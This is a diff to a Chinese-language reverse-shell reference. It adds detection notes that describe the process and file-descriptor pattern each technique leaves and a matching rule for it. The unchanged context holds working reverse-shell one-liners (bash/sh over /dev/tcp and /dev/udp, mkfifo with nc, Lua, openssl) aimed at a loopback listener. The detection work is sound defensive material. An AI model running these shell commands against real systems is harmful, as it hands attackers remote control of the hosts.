@@ -22,6 +22,13 @@ nc -nvlp 1234
 ![agent](../images/WechatIMG53.jpeg)
 
 
+目标机执行后的结果如下：
+
+创建了一个常住进程“bash -i”， 它的得0和1文件描述符都指向socket。
+
+匹配规则：bash进程的0，和1文件描述符指向socket
+
+
 ```bash
 
 sh -i >& /dev/udp/127.0.0.1/1234 0>&1 #UDP
@@ -32,6 +39,13 @@ nc -u -lvp 1234
 ```
 
 ![agent](../images/WechatIMG54.jpeg)
+
+
+目标机执行后的结果如下：
+
+创建了一个常住进程“sh -i”， 它的得0和1文件描述符都指向socket。
+
+匹配规则：bash进程的0，和1文件描述符指向socket
 
 ```bash
 0<&196;exec 196<>/dev/tcp/127.0.0.1/1234; sh <&196 >&196 2>&196
@@ -148,7 +162,11 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc  127.0.0.1 1234 >/tmp/f
 ![agent](../images/WechatIMG62.jpeg)
 ![agent](../images/WechatIMG63.jpeg)
 
+目标机执行后的结果如下：
 
+创建了bash进程，0和1描述符都指向了pipe，这两个pipe关联到文件和nc上。
+
+匹配规则：bash进程的0，和1文件描述符指向pipe
 
 ```lua
 
@@ -157,6 +175,12 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','12
 ```
 
 ![agent](../images/WechatIMG54.jpeg)
+
+目标机执行后的结果如下：
+
+创建了sh进程，0和1描述符都指向了socket。
+
+匹配规则：sh的0，和1文件描述符指向socket
 
 
 Java
@@ -202,6 +226,11 @@ Nodejs
 
 ![agent](../images/WechatIMG66.jpeg)
 
+目标机执行后的结果如下：
+创建了sh进程，0和1描述符都指向了socket。
+
+匹配规则：bash的0，和1文件描述符指向socket
+
 ```
 
 
@@ -216,6 +245,11 @@ or
 ```
 
 ![agent](../images/WechatIMG63.jpeg)
+目标机执行后的结果如下：
+
+创建了bash进程，0和1描述符都指向了pipe，这两个pipe关联到nc进程上。nc创建了socket外联。
+
+匹配规则：bash进程的0，和1文件描述符指向pipe
 
 
 用openssl 反弹shell
@@ -240,8 +274,11 @@ openssl s_client -quiet -connect 127.0.0.1:1234|/bin/bash|openssl s_client -quie
 
 ```
 
-![agent](../images/WeChat8872f342986ad270beb9f2cfed15620b.png)
+![agent](../images/WeChat8872f342986ad270beb9f2cfed15620b.png)目标机执行后的结果如下：
 
+创建了一个常住进程“bash”， 它的得0和1文件描述符都指向socket。
+
+匹配规则：bash进程的0，和1文件描述符指向socket
 
 ```bash
 
@@ -288,7 +325,11 @@ int main(void){
 ![agent](../images/WeChatb7a57e2e1c37e20c37bb206518c75d7a.png)
 
 
+目标机执行后的结果如下：
 
+创建了一个常住进程“sh ”， 它的得0和1文件描述符都指向socket。
+
+匹配规则：sh进程的0，和1文件描述符指向socket
 
 
 
